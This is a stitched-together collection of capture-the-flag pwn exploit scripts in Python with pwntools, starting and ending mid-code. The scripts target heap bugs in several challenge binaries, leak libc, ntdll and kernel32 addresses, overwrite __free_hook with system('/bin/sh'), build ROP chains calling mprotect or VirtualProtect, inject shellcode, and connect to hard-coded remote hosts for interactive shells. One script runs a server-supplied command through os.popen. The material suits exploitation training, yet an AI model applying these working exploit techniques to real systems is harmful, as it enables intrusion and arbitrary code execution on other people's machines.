'04dd5a70faea88b76e4733d0fa346b086e2c0efd7d2815e3b6ca118ab945719970642b2929b18a71b28d87855796e344d8'\n\nif __name__=='__main__':\n    flag_length = int(len(output_file_content)/2)\n\n    buf = bytes.fromhex(output_file_content)\n\n    state = flag_key*6364136223846793005+6364136223846793005+1\n    state &= 0xffffffffffffffff\n    x=pcg32(state,1)\n\n    keys = keygen()\n    res = decrypt(keys, buf)\n    print (res)\n\nNOP = 1\nADD = 2\nSUB = 3\nMUL = 4\nMOD = 5\nXOR = 6\nAND = 7\nLWR = 8\nEQU = 9\nJMP = 10\nJT = 11\nJF = 12\n# IMM = 13\nPOP = 14\n# GET = 15\n# SET = 16\n# NEW = 17\n# DEL = 18\nEDIT = 19\nSHOW = 20\n\n\ndef IMM(v):\n    assert v <= 10\n    return [13, -v]\n\ndef IMMX(v):\n    if v <= 10:\n        return IMM(v)\n    else:\n        hi, lo = divmod(v, 10)\n        pl = IMMX(hi) + IMM(10) + [MUL]\n        if lo != 0:\n            pl += IMM(lo) + [ADD]\n    return pl\n\ndef GET(idx, off):\n    return IMMX(off) + IMMX(idx) + [15]\n\ndef SET(idx, off):\n    return IMMX(off) + IMMX(idx) + [16]\n\ndef STR(idx, s):\n    pl = []\n    for i, c in enumerate(s):\n        pl += IMMX(ord(c)) + IMMX(i) + IMM(idx) + [16] # set\n    return pl\n\ndef GETI():\n    return GET(0, 0)\n\ndef GETJ():\n    return GET(0, 1)\n\ndef LOC(i):\n    return [i | (1 << 30)] * 14 # len(IMMX(999))\n\ndef NEW(sz):\n    return IMMX(sz) + [17]\n\ndef DEL(i):\n    return IMMX(i) + [18]\n\nSZ = 0x82 # 130\n\npl = []\n# pl += NEW(SZ) * 10\nloc2 = len(pl)\npl += NEW(SZ)\npl += IMM(1) + GETI() + [ADD] + SET(0, 0) # ++i\npl += IMM(10) + GETI() + [LWR] + LOC(2) + [JT]\n\npl += DEL(7)\n\npl += [SUB, ADD]\npl += IMMX(0xB0) + [SUB] + IMM(0) + [SUB] # item9 = item8\n\npl += DEL(9) + DEL(8) # double free item8 & data8\npl += NEW(0) # item7 = data7 # fix fd = size = 0\npl += NEW(SZ) * 2 # data8 = data9\n\nfor i in xrange(7): # tcache\n    pl += DEL(i)\npl += DEL(8) # unsoted bin\n\npl += NEW(SZ)\npl += IMM(8) + SET(0, 0) # i = 8\nloc1 = len(pl)\npl += GETI() + IMM(9) + [15] + [22] # print(itoa(item[9][i]))\npl += IMMX(980) + [22]\npl += IMM(1) + GETI() + [ADD] + SET(0, 0) # ++i\npl += IMMX(8 + 6) + GETI() + [LWR] + LOC(1) + [JT]\n\npl += [NOP]\npl += IMM(9) + [EDIT]\npl += IMMX(0xB0 * 2) + [SUB] + IMM(0) + [SUB] # item9 = data9\npl += IMM(9) + [EDIT]\npl += DEL(9)\n\npl += [0x17]\n\nprint(len(pl))\n# print(pl)\ni = 0\nwhile i < len(pl):\n    v = pl[i]\n    if v == LOC(1)[0]:\n        r = loc1\n    elif v == LOC(2)[0]:\n        r = loc2\n    else:\n        assert type(v) == int\n        i += 1\n        continue\n    a, t = divmod(r, 100)\n    b, c = divmod(t, 10)\n    t = IMM(a) + IMM(10) + [MUL] + IMM(b) + [ADD] + IMM(10) + [MUL] + IMM(c) + [ADD]\n    assert len(t) == 14\n    pl = pl[:i] + t + pl[i + 14:]\n    i += len(t)\n# print(pl)\n\nconsts = [128512,128513,128514,129315,128540,128516,128517,128518,128521,128522,128525,]\nopcodes = [0,127539,10133,10134,10060,0x2753,10062,128107,128128,128175,128640,127542,127514,9196,128285,128228,128229,127381,127379,128196,128221,128289,128290,0x1F6D1,]\n\nmp = {\n0x23EC: '\\xE2\\x8F\\xAC',\n0x274c: '\\xE2\\x9D\\x8C',\n0x274e: '\\xE2\\x9D\\x8E',\n0x2753: '\\xE2\\x9D\\x93',\n0x2795: '\\xE2\\x9E\\x95',\n0x2796: '\\xE2\\x9E\\x96',\n0x1F193: '\\xF0\\x9F\\x86\\x93',\n0x1F195: '\\xF0\\x9F\\x86\\x95',\n0x1F21A: '\\xF0\\x9F\\x88\\x9A',\n0x1F233: '\\xF0\\x9F\\x88\\xB3',\n0x1F236: '\\xF0\\x9F\\x88\\xB6',\n0x1f46b: '\\xF0\\x9F\\x91\\xAB',\n0x1f480: '\\xF0\\x9F\\x92\\x80',\n0x1f4af: '\\xF0\\x9F\\x92\\xAF',\n0x1f4c4: '\\xF0\\x9F\\x93\\x84',\n0x1f4dd: '\\xF0\\x9F\\x93\\x9D',\n0x1f4e4: '\\xF0\\x9F\\x93\\xA4',\n0x1f4e5: '\\xF0\\x9F\\x93\\xA5',\n0x1f51d: '\\xF0\\x9F\\x94\\x9D',\n0x1f521: '\\xF0\\x9F\\x94\\xA1',\n0x1f522: '\\xF0\\x9F\\x94\\xA2',\n0x1f600: '\\xF0\\x9F\\x98\\x80',\n0x1f601: '\\xF0\\x9F\\x98\\x81',\n0x1f602: '\\xF0\\x9F\\x98\\x82',\n0x1f604: '\\xF0\\x9F\\x98\\x84',\n0x1f605: '\\xF0\\x9F\\x98\\x85',\n0x1f606: '\\xF0\\x9F\\x98\\x86',\n0x1f609: '\\xF0\\x9F\\x98\\x89',\n0x1f60a: '\\xF0\\x9F\\x98\\x8A',\n0x1f60d: '\\xF0\\x9F\\x98\\x8D',\n0x1f61c: '\\xF0\\x9F\\x98\\x9C',\n0x1f680: '\\xF0\\x9F\\x9A\\x80',\n0x1f6d1: '\\xF0\\x9F\\x9B\\x91',\n0x1f923: '\\xF0\\x9F\\xA4\\xA3',\n}\n\n\nout = []\ni = 0\nwhile i < len(pl):\n    v = pl[i]\n    assert type(v) == int\n    if v <= 0:\n        t = abs(v)\n        assert t <= 10\n        out.append(mp[consts[t]])\n        i += 1\n    elif 0 < v and v < 0x18:\n        out.append(mp[opcodes[v]])\n        i += 1\n    else:\n        raise ValueError, v\n\nfinal = ''.join(out)\nprint(len(final))\nopen('payload', 'wb').write(final)\n\nfrom pwn import *\nimport os\n\n\nlibc = ELF('./libc.so')\n\ncontext.log_level = 'debug'\n\n# p = process(argv=['./emojivm1', 'payload'])\np = remote('3.115.176.164', 30262)\n\np.recvuntil('token:\\n')\ncmd = p.recvline(False)\ninfo('cmd: %s', cmd)\n\nans = os.popen(cmd).read().strip()\ninfo('ans: %s', ans)\np.sendlineafter('hashcash token: ', ans)\n\npayload = open('payload', 'rb').read()\np.sendlineafter('Your emoji file size: ( MAX: 1000 bytes ) ', str(len(payload)))\np.sendafter('Input your emoji file:\\n', payload)\n\nr = 0\nfor i in xrange(6):\n    t = p.recvuntil('980', True)\n    r += (int(t) % 256) << (i * 8)\nr -= 0x3EBCA0 + 0x100\ninfo('libc: %#x', r)\nlibc.address = r\n\npl = p64(0x10) + p64(libc.sym['__free_hook'] - 8)\np.send(pl)\n\npl = '/bin/sh\\0' + p64(libc.sym['system'])\np.send(pl)\n\np.interactive()\n\nfrom pwn import *\nfrom random import *\nfrom time import time\nfrom hashlib import *\nfrom Crypto.Cipher import AES\nfrom binascii import *\n\nAES_BLOCK_SIZE = 16\ng_local=1\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nif g_local:\n    sh = process(\"./chall\")\n    gdb.attach(sh)\nelse:\n    sh = remote(\"3.113.219.89\", 31337)\n\ndef enc(off, size=0xf):\n    off &= 0xffffffffffffffff\n    size &= 0xffffffffffffffff\n    sh.sendline(str(off))\n    sh.sendlineafter(\"size:\", str(size))\n    ret = sh.recvuntil(\"offset:\")[:-len(\"offset:\")]\n    assert len(ret) % 0x10 == 0\n    return ret\n\nkey = enc(-0x20)\niv = 0x10 * '\\x00'\ndef dec(data):\n    return AES.new(key, AES.MODE_CBC, iv).decrypt(data)\ndef enc2(data):\n    return AES.new(key, AES.MODE_CBC, iv).encrypt(data)\n\nprog_addr = dec(enc(-0x3a0))\nprog_addr = u64(prog_addr[8:]) - 0x202008\nprint hex(prog_addr)\n\n\nlibc_addr = dec(enc(-0x40))\nlibc_addr = u64(libc_addr[:8]) - e.symbols[\"_IO_2_1_stderr_\"]\nprint hex(libc_addr)\n\ndef calc_off(addr):\n    return addr - (prog_addr + 0x2023a0)\n\nenv_off = calc_off(libc_addr+0x3f04c0)\n\nstack_addr = dec(enc(env_off))\nstack_addr = u64(stack_addr[:8]) + 0x10 - 0x120\nprint hex(stack_addr)\n\n# 0.5, need to make i negative\nenc(calc_off(stack_addr))\n\n\n# previous bytes might be affected\ndef write_byte(addr, val, data):\n    assert len(data) == 0x10\n    off = calc_off(addr - 0xf)\n    count = 0\n    while True:\n        data = enc2(data)\n        count += 1\n        if u8(data[0xf]) == val:\n            break\n    for i in xrange(count):\n        sh.send(str(off) + '\\n15\\n')\n    for i in xrange(count):\n        sh.recvuntil(\"offset:\")\n    return data\n\nld_addr = libc_addr + 0x3f1000\n\ndef write_bytes(addr, s, data):\n    assert len(data) == 0x10 + len(s)\n    i = len(s) - 1\n    for c in s[::-1]:\n        data = data[:1+i] + write_byte(\\\n            addr + i, u8(c), data[1+i:0x11+i]) + \\\n            data[0x11+i:]\n        i -= 1\n\n# print hex(u64(dec(enc(calc_off(ld_addr + 0x228f50)))[:8]))\n# sh.interactive()\nod1 = p64(0) + p64(1)\nwrite_bytes(ld_addr + 0x228968, \"sh\", od1 + 2*'\\x00')\nod2 = p64(0) + p64(0)\nwrite_bytes(ld_addr + 0x228f60, \\\n    p64(libc_addr + e.symbols[\"system\"])[:3], \\\n    od2+p64(ld_addr+0x10e0)[:3])\n# local 0x440->0x441\n# remote 0x440->0x496\n\n# print hex(libc_addr + e.symbols[\"system\"])\n# print hex(u64(dec(enc(calc_off(ld_addr + 0x228f60)))[:8]))\n# print hex(u64(dec(enc(calc_off(ld_addr + 0x228968)))[:8]))\n\nsh.interactive()\n\nfrom pwn import *\ncontext(arch = 'amd64', os = 'linux', endian = 'little')\ncontext.log_level = 'debug'\nlibc = ELF(\"./libc.so.6\")\n\ndef buy_house(idx, size, content = ''):\n    p.recvuntil('Your choice: ')\n    p.sendline('1')\n    p.recvuntil('Index:')\n    p.sendline(str(idx))\n    p.recvuntil('Size:')\n    p.sendline(str(size))\n    if content != '':\n        p.recvuntil('House:')\n        p.send(content)\n\ndef show_house(idx):\n    p.recvuntil('Your choice: ')\n    p.sendline('2')\n    p.recvuntil('Index:')\n    p.sendline(str(idx))\n\ndef sell(idx):\n    p.recvuntil('Your choice: ')\n    p.sendline('3')\n    p.recvuntil('Index:')\n    p.sendline(str(idx))\n\ndef upgrade(idx, content):\n    p.recvuntil('Your choice: ')\n    p.sendline('4')\n    p.recvuntil('Index:')\n    p.sendline(str(idx))\n    p.recvuntil('House:')\n    p.send(content)\n\ndef buy_super_house(content):\n    p.recvuntil('Your choice: ')\n    p.sendline('5')\n    p.recvuntil('House:')\n    p.send(content)\n\ndef GameStart(ip, port, debug):\n    global p\n    if debug == 1:\n        p = process(\"./lazyhouse\")\n        # p = process(['ld-linux-x86-64.so.2', './lazyhouse'], env = {'LD_PRELOAD' : './libc.so.6'})\n    else:\n        p = remote(ip, port)\n    buy_house(1, 0x13f69b02593f69b1)\n    sell(1)\n    buy_house(1, 0x109bb0727572e2bd)\n    sell(1)\n    buy_house(1, 0x13f2b1389a662c33)\n    sell(1)\n    buy_house(1, 0x4fcace18cee3091)\n    sell(1)\n    for i in range(7):\n        buy_house(1, 0x100, 'sw tcl')\n        sell(1)\n    for i in range(8):\n        buy_house(i, 0x100, 'sw tcl')\n    #pause()\n    upgrade(0, '\\x00' * 0x100 + p64(0) + p64(0x661))\n    sell(1)\n    buy_house(1, 0x650, '\\x00' * 0x100 + (p64(0) + p64(0x111) + '\\x00' * 0x100) * 6)\n    sell(2)\n    sell(4)\n    show_house(1)\n    p.recvn(0x110)\n    libc_addr = u64(p.recvn(8)) - 0x1e4ca0\n    heap_addr = u64(p.recvn(8)) - 0xe00\n    log.info('libc addr is : ' + hex(libc_addr))\n    log.info('heap addr is : ' + hex(heap_addr))\n    buy_house(2, 0x3a0, '\\x00')\n    sell(2)\n    buy_house(2,9999999999999999)\n    buy_house(2, 0x100, 'AAA')\n    buy_house(4, 0x100, 'AAA')\n    sell(1)\n    payload = '\\x00' * 0x100 + p64(0) + p64(0x111) + p64(0) + p64(0xdeadbeef) + p64(0x21) * (0xf0/8)\n    payload += p64(0) + p64(0x21) + p64(0x21) * (0x100/8)\n    payload += p64(0) + p64(0x31) + p64(0x21) * (0x100/8)\n    payload += p64(0) + p64(0x141) + p64(0x21) * (0x100/8)\n    payload += p64(0) + p64(0x141) + p64(0x21) * (0x100/8)\n    buy_house(1, 0x650, payload)\n    sell(2)\n    buy_house(2,9999999999999999)\n    sell(3)\n    sell(4)\n    sell(1)\n\n    payload = '\\x00' * 0x100 + p64(0) + p64(0x111) + p64(0) + p64(heap_addr + 0xd00) + p64(0x21) * (0xf0/8)\n    payload += p64(0) + p64(0x131) + p64(0x21)*2 + p64(heap_addr+0xbe0) + p64(heap_addr+0x40) + p64(0x21) * (0x100/8 - 4)\n    payload += p64(0) + p64(0x141) + p64(heap_addr + 0x40)*5 + p64(0x21) * (0x100/8 - 5)\n    payload += p64(0) + p64(0x141) + p64(0x21) * (0x100/8)\n    payload += p64(0) + p64(0x141) + p64(0x21) * (0x100/8)\n    buy_house(1, 0x650, payload)\n    buy_house(3, 0x100, '\\x00')\n    buy_house(4, 0x100, '\\x00')\n    sell(5)\n    libc.address = libc_addr\n    free_hook = libc.symbols['__malloc_hook']\n    mprotect = libc.symbols['mprotect']\n    open_addr = libc.symbols['open']\n    poprdi = libc_addr + 0x26542\n    poprdxrsi = libc_addr + 0x012bdc9\n    poprsi = libc_addr + 0x026f9e\n    leave_ret = libc_addr + 0x0000000000058373\n    longjmp = libc_addr + 277552\n    buy_house(5, 0x108, p64(free_hook)*(0x108/8))\n    buy_super_house(p64(leave_ret))\n    buffer_addr = heap_addr + 0xae0\n    read_addr = libc.symbols['read']\n    write_addr = libc.symbols['write']\n    payload = p64(heap_addr) + p64(poprdi) + p64(heap_addr) + p64(poprdxrsi) + p64(7) + p64(0x1000) +  p64(mprotect)\n    payload += p64(buffer_addr + 0x40)\n    payload += '\\x90'*0x8\n    code = asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_open',buffer_addr + 0x300, 2))\n    code += asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_read', 'rax', heap_addr, 0x100))\n    code += asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_write', 1 , heap_addr, 0x100))\n    code += asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_exit', 0))\n    payload += code \n    #upgrade(1, payload.ljust(0x300, '\\x00') + \"./flag\")\n    upgrade(1, payload.ljust(0x300,'\\x00') + '/home/lazyhouse/flag')\n    #pause()\n    buy_house(2, str(buffer_addr))\n    p.interactive()\n\nif __name__ == '__main__':\n    #GameStart('3.115.121.123', 5731, 0)\n    GameStart('127.0.0.1', 23335, 0)\n\n#! /usr/bin/env python2\n# -*- coding: utf-8 -*-\n# vim:fenc=utf-8\n#\n# Copyright © 2018 anciety <anciety@anciety-pc>\n#\n# Distributed under terms of the MIT license.\nimport sys\nimport os\nimport os.path\nfrom pwn import *\ncontext(os='linux', arch='amd64', log_level='debug')\ncontext.terminal = ['ancyterm', '-s', '192.168.142.1', '-t', 'alacritty', '-e']\n\n# synonyms for faster typing\ntube.s = tube.send\ntube.sl = tube.sendline\ntube.sa = tube.sendafter\ntube.sla = tube.sendlineafter\ntube.r = tube.recv\ntube.ru = tube.recvuntil\ntube.rl = tube.recvline\ntube.rr = tube.recvregex\ntube.irt = tube.interactive\n\nif len(sys.argv) > 2:\n    DEBUG = 0\n    HOST = sys.argv[1]\n    PORT = int(sys.argv[2])\n\n    p = remote(HOST, PORT)\n    p.ru('of:\\n')\n    hashcash = p.rl()\n    res = raw_input()\n    p.sl(res)\nelse:\n    DEBUG = 1\n    if len(sys.argv) == 2:\n        PATH = sys.argv[1]\n\n    p = process(PATH)\n\n\n# by w1tcher who dominates pwnable challenges\ndef house_of_orange(head_addr, system_addr, io_list_all):\n    payload = b'/bin/sh\\x00'\n    payload = payload + p64(0x61) + p64(0) + p64(io_list_all - 16)\n    payload = payload + p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4\n    payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + \\\n            p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)\n    return payload\n\n\norig_attach = gdb.attach\ndef gdb_attach(*args, **kwargs):\n    if DEBUG:\n        orig_attach(*args, **kwargs)\ngdb.attach = gdb_attach\n\ndef cmd(f):\n    def wrapped_cmd(*args, **kwargs):\n        p.ru('>>> ')\n        f(*args, **kwargs)\n    return wrapped_cmd\n\n\n@cmd\ndef insert(idx, content):\n    p.sl('i {} {}'.format(idx, content))\n\n@cmd\ndef cut(idx, count):\n    p.sl('c {} {}'.format(idx, count))\n\n@cmd\ndef new_tab():\n    p.sl('n')\n\n@cmd\ndef switch(to):\n    p.sl('s {}'.format(to))\n\n@cmd\ndef paste(idx):\n    p.sl('p {}'.format(idx))\n\n@cmd\ndef replace(idx, length, c):\n    p.sl('r {} {} {}'.format(idx, length, c))\n\n@cmd\ndef delete(idx, length):\n    p.sl('D {} {}'.format(idx, length))\n\n@cmd\ndef display(idx, size):\n    p.sl('d {} {}'.format(idx, size))\n\ndef main():\n    p.ru('Luna - ')\n    p.ru('--------------')\n    insert(0, 'a' * 0xf8)\n    new_tab() # 1\n    insert(0, 'b' * 0x10)\n    cut(0, 0x10) # full cut\n    switch(0)\n    cut(0, 0xf0) # partial cut\n\n    # now the pastebin should have a cache of 0x10, but length of 0x200\n    # transfer pastebin to current tab\n    new_tab() # 2\n    paste(0)\n\n    # now we can use replace to OOB write the heap (on tab #2)\n    # but let's get out a freed chunk first\n    new_tab() # 3\n    insert(0, 'f' * 0xf8)\n    new_tab() # 4\n    insert(0, 'g' * 0xf8)\n    switch(3)\n    #raw_input('>> break free')\n    delete(0, 0xf8) # free(chunk of size(0x208))\n    switch(4)\n    delete(0, 0xf8)\n\n    switch(2)\n\n    # target 0xd10\n    # we are at 0xc80\n\n    __free_hook = target = 0x6D9E78 # __free_hook\n    idx = 0xd10 - 0xc80\n\n    packed = p64(target)\n    \n    for i in range(len(packed)):\n        c = packed[i]\n        replace(idx + i, 1, c)\n\n    new_tab() # 3\n    switch(3)\n\n    pivot = 0x00000000004a8f86 # mov rsp, rcx ; ret\n    add_rsp_80 = 0x0000000000416cf7 # add rsp, 0x80 ; ret\n    add_rsp_d8 = 0x0000000000410a83 # add rsp, 0xd8 ; ret\n    pop_rdi_rbp = 0x00000000004038d5 # pop rdi ; pop rbp ; ret\n    pop_rdi = 0x00000000004006a6 # pop rdi ; ret\n    pop_rsi_rbp = 0x0000000000410cee # pop rsi ; pop rbp ; ret\n    pop_rsi = 0x0000000000411583 # pop rsi ; ret\n    pop_rax_rdx_rbx = 0x000000000048bf36 # pop rax ; pop rdx ; pop rbx ; ret\n    xor_rax = 0x0000000000445e70 # xor rax, rax ; ret\n    add_rax_1 = 0x000000000047eb80 # add rax, 1 ; ret\n    syscall = 0x47f927\n    sal_edi = 0x000000000048b1cd # sal edi, 0xd8 ; ret\n    mov_edi_edx = 0x0000000000497b71 # mov edi, edx ; mov byte ptr [rsi], al ; jne 0x497b59 ; mov rax, rsi ; ret\n    xchg_eax_ebp = 0x00000000004517bf # xchg eax, ebp ; ret\n    add_eax_3 = 0x000000000047eb91 # add eax, 3 ; ret\n    mov_rax_1 = 0x000000000047ebb0 # mov rax, 1 ; ret \n    mov_rax_2 = 0x000000000047ebc0 # mov rax, 2 ; ret\n    mov_rax_3 = 0x000000000047ebd0 # mov rax, 3 ; ret\n    xor_eax = 0x000000000040feed # xor eax, eax ; ret\n\n    pop_rdx = 0x000000000044ab35 # pop rdx ; ret \n    pop_rdx_rbx = 0x000000000048bf37 # pop rdx ; pop rbx ; ret\n    open_fn = 0x44aa80\n    read_fn = 0x44ab20\n    puts_fn = 0x411720\n    fputs_fn = 0x479770\n\n    data = 0x6da100\n    # 0x44 X\n    ## 0x15 X\n    flag1_addr = data\n    rop = p64(mov_rax_3)\n    rop += p64(pop_rdi)\n    rop += p64(2)\n    rop += p64(syscall)\n    rop += p64(pop_rdi)\n    rop += p64(flag1_addr)\n    rop += p64(pop_rsi_rbp)\n    rop += p64(0)\n    rop += p64(0)\n    rop += p64(mov_rax_2)\n    rop += p64(syscall)\n    \n    rop += p64(pop_rdi)\n    rop += p64(2)\n    rop += p64(pop_rsi_rbp)\n    rop += p64(data)\n    rop += p64(0)\n    rop += p64(pop_rdx_rbx)\n    rop += p64(0x100)\n    rop += p64(0)\n    rop += p64(mov_rax_1)\n    rop += p64(xor_eax)\n    rop += p64(syscall)\n    rop += p64(pop_rdi)\n    rop += p64(1)\n    rop += p64(pop_rsi_rbp)\n    rop += p64(data)\n    rop += p64(0)\n    rop += p64(mov_rax_1)\n    rop += p64(syscall)\n\n    print(len(rop))\n    assert len(rop) <= 0xf0\n\n    insert(0, 'flag1\\x00'.ljust(0xf8, 'c'))\n    new_tab() # 4\n    switch(4)\n    insert(0, 'a' * 8)\n    cut(0, 1)\n    new_tab() # 5\n    switch(5)\n    insert(0, p64(pivot) + rop.ljust(0xf0, '1'))\n    #insert(0, p64(pivot) + '\\x00' * 0xf0)\n    switch(2)\n    idx = 0xcd0 - 0xc80\n    replace(idx, 1, chr(0xd0))\n    display(0, 8)\n    p.info(p.ru('\\xd0'))\n    leaked = '\\xd0'\n    while len(leaked) < 8:\n        leaked += p.r(8 - len(leaked))\n    heap_addr = u64(leaked)\n    p.info('leaked heap 0x{:x}'.format(heap_addr))\n\n    switch(2)\n    replace(0, 1, chr(0x60))\n    target = 0x555555babeb0 - 0x555555babcd0 + heap_addr\n    payload = p32(0x500) + p32(1) + p64(0) + p64(target)\n    for i in range(len(payload)):\n        c = payload[i]\n        replace(i, 1, c)\n\n    new_tab()\n    #switch(1)\n    p.sl('s 1')\n    pop_rsp = 0x0000000000403073 # pop rsp ; ret\n    data = 0x6da100\n\n    temp = p64(pop_rsp)\n    temp += p64(__free_hook + 8)\n    for i in range(len(temp)):\n        c = temp[i]\n        replace(i, 1, c)\n\n\n    switch(2)\n    #target = 0x555555babeb0 - 0x555555babcd0 + heap_addr + 0xd8\n    target = data\n    payload = p64(target)\n    for i in range(len(payload)):\n        c = payload[i]\n        replace(0x10 + i, 1, c)\n\n    raw_input('>> break final')\n    switch(1)\n    rop = '/home/poe/flag1\\x00'\n    for i in range(len(rop)):\n        c = rop[i]\n        replace(i, 1, c)\n\n    # trigger __free_hook\n    switch(6)\n    paste(0)\n\n    p.irt()\n\nif __name__ == '__main__':\n    main()\n\n\nfrom utility import *\nfrom pprint import pprint\n\ndebug = 0\nif debug:\n    p = pwn('127.0.0.1:4869')\n    ntdll_off = 0x2a0 + 32\n    to_ntdll = 0x163D40  # 0x15ACB0\n    to_peb = 0x165368  # 0x15C338\n    to_stack = 0xcd0\nelse:\n    p = pwn('13.230.51.176:4869')\n    ntdll_off = 0x2a0 + 32\n    to_ntdll = 0x163d10\n    to_peb = 0x165368\n    to_stack = 0xcd0\np.sendlineafter('>>', '1')\np.sendlineafter(':', 'orange')\np.sendlineafter(':', 'godlike')\n\n\ndef pad(k):\n    return k.ljust(0x40 - 1, '\\x00')\n\n\ndef create(key, buf, size=None):\n    if not size:\n        size = len(buf)\n    key = pad(key)\n    p.sendlineafter('>>', '1')\n    p.sendlineafter(':', key)\n    p.sendlineafter(':', str(size))\n    if len(buf) >= size:\n        p.sendafter(':', buf)\n    else:\n        p.sendlineafter(':', buf)\n\n\ndef show(key):\n    key = pad(key)\n    p.sendlineafter('>>', '2')\n    p.sendlineafter(':', key)\n    p.recvuntil('Data:')\n\n\ndef logout():\n    p.sendlineafter('>>', '4')\n\n\ndef free(key):\n    key = pad(key)\n    p.sendlineafter('>>', '3')\n    p.sendlineafter(':', key)\n\n\ncreate('\\x05', 'a' * 0x50)\ncreate('\\x01', 'b' * 0x50)\ncreate('\\x02', 'c' * 0x500)\nfree('\\x05')\ncreate('\\x02', 'd' * 0xb0)\nshow('\\x02')\np.recvuntil('d' * 0xb0)\ndata = p.recvuntil('\\norange', drop=1)\ndata = data[0x18:]\nheader = u64(data[:8])\nheap = u64(data[8:16])\nlog.info('heap header: {}'.format(hex(header)))\nlog.info('heap: {}'.format(hex(heap)))\nptr = heap & 0xfffffffffffff000\nptr += ntdll_off\nlog.info('target : {}'.format(hex(ptr)))\nfree('\\x02')\ncreate('\\x02', 'c' * 0x500)\ncreate('\\x02', 'e' * 0x58 + p64(header) + p64(ptr), 0x50)\nshow('\\x01')\ndata = p.recvuntil('\\norange', drop=1)\nntdll = u64(data[:8])\nfree('\\x02')\nntdll -= to_ntdll\nlog.info('ntdll: {}'.format(hex(ntdll)))\n\ncreate('\\x02', 'c' * 0x500)\ncreate('\\x02', 'e' * 0x58 + p64(header) + p64(ntdll + to_peb), 0x50)\nshow('\\x01')\ndata = p.recvuntil('\\norange', drop=1)\npeb = u64(data[:8])\nlog.info('peb: {}'.format(hex(peb)))\nfree('\\x02')\n\ncreate('\\x02', 'c' * 0x500)\ncreate('\\x02', 'e' * 0x58 + p64(header) + p64(peb + to_stack), 0x50)\nshow('\\x01')\ndata = p.recvuntil('\\norange', drop=1)\nstack = u64(data[:8])\nlog.info('stack: {}'.format(hex(stack)))\nfree('\\x02')\ntarget_stack = stack >> 16\ntarget_stack += 1\ntarget_stack <<= 16\ntarget_stack -= 0x1000\nstack = target_stack\nlog.info('stack target: {}'.format(hex(target_stack)))\n\ncreate('\\x02', 'c' * 0x500)\ncreate('\\x02', 'e' * 0x58 + p64(header) + p64(target_stack) + p64(0x1000), 0x50)\nshow('\\x01')\ndata = p.recvuntil('\\norange', drop=1)\nindex = data.find('\\x19' + '\\x00' * 15) - 0xd8\nbase = u64(data[index:index + 8]) - 0x1E38\nlog.info('base: ' + hex(base))\ntarget_stack += index\nlog.info('stack target: {}'.format(hex(target_stack)))\nfree('\\x02')\n\nencode = heap & 0xfffffffffffff000\nencode += 0x88\ncreate('\\x02', 'c' * 0x500)\ncreate('\\x02', 'e' * 0x58 + p64(header) + p64(encode), 0x50)\nshow('\\x01')\ndata = p.recvuntil('\\norange', drop=1)\nencode = u64(data[:8])\nlog.info('encode: {}'.format(hex(encode)))\nfree('\\x02')\n\ncreate('\\x02', 'c' * 0x500)\ncreate('\\x02', 'e' * 0x58 + p64(header) + p64(base + 0x3000), 0x50)\nshow('\\x01')\ndata = p.recvuntil('\\norange', drop=1)\nkernel32 = u64(data[:8]) - 0x22680\nlog.info('kernel32: {}'.format(hex(kernel32)))\n# free('\\x02')\nfake = heap & 0xfffffffffffff000\nfake += 0xc20\ncreate('a', '1' * 0x100)\ncreate('b', '2' * 0x20)\ncreate('c', '3' * 0x200)\ncreate('d', '4' * 0x20)\ncreate('e', '5' * 0x500)\ncreate('f', '6' * 0x80)\ncreate('g', '7' * 0x80)\n\nfree('a')\nfree('c')\ncreate('e', '8' * 0x178 + p64(encode ^ 0x1000001806010007) + p64(heap) + p64(0x20) + 'nonick'.ljust(0x58, '.') + p64(\n    encode ^ 0x1000000702010003) + 'nonick'.ljust(0x28, '.') + p64(encode ^ 0x328000028) + p64(base + 0x5630), 0x170)\nlogout()\np.sendlineafter('>>', '1')\np.sendlineafter(':', 'orange\\x00\\x00' + p64(encode ^ 0x328000028) + p64(fake) + p64(fake)[:-1])\np.sendlineafter(':', 'godlike')\npayload = p64(base + 0x5630) * 2\npayload += p64(stack) * 2\npayload += p32(0)\npayload += p32(0x4C0 | (1 << 0xd))\npayload += p64(0)\npayload += p64(0x1000)\npayload += p64(0)\npayload += '\\xff' * 12 + '\\x00' * 0x14\npayload += p64(0xfa0)\n\ncreate('f', payload, 0x270)\npayload = 'a' * 0x10\npayload += p64(heap & 0xfffffffffffff000)\npayload += 'a' * 0x20\npayload += p64(fake + 0x10)\ncreate('g', payload, 0x270)\nlogout()\np.sendlineafter('>>', '1')\np.sendlineafter(':', 'orange')\n\np.sendlineafter(':', 'godlike')\npayload = 'a' * ((target_stack & 0xfff) - 0x6a0)\n\naddrsp = base + 0x01d0b\nvirtual_protect = kernel32 + 0x1B680\npoprcx = ntdll + 0x9217b\npoprdx = ntdll + 0x57642\npopr8 = ntdll + 0x2010b\npoprax = ntdll + 0x2010c\npopr9_jmp = ntdll + 0x08fb15\n\npayload += p64(addrsp)\npayload += 'a' * 0x28\npayload += p64(base + 0x1fcc)\npayload += 'x' * 0x38\npayload += p64(poprax)\npayload += p64(virtual_protect)\npayload += p64(poprcx)\npayload += p64(stack)\npayload += p64(poprdx)\npayload += p64(0x1000)\npayload += p64(popr8)\npayload += p64(0x40)\npayload += p64(popr9_jmp)\npayload += p64(base + 0x5630)\npayload += p64(0) * 2\npayload += p64(stack + len(payload) + 0x20)\npayload += '\\x90' * 0x100\n\nbuf = [\n    0x40, 0x57, 0x48, 0x81, 0xEC, 0x50, 0x01, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00,\n    0x00, 0x00, 0x48, 0x89, 0xAC, 0x24, 0x70, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x48, 0x18, 0x4C, 0x8B,\n    0x41, 0x10, 0x49, 0x8B, 0x78, 0x60, 0x4C, 0x8B, 0xCF, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,\n    0x48, 0x85, 0xFF, 0x74, 0x2C, 0x0F, 0xB7, 0x07, 0x33, 0xD2, 0xB9, 0x05, 0x15, 0x00, 0x00, 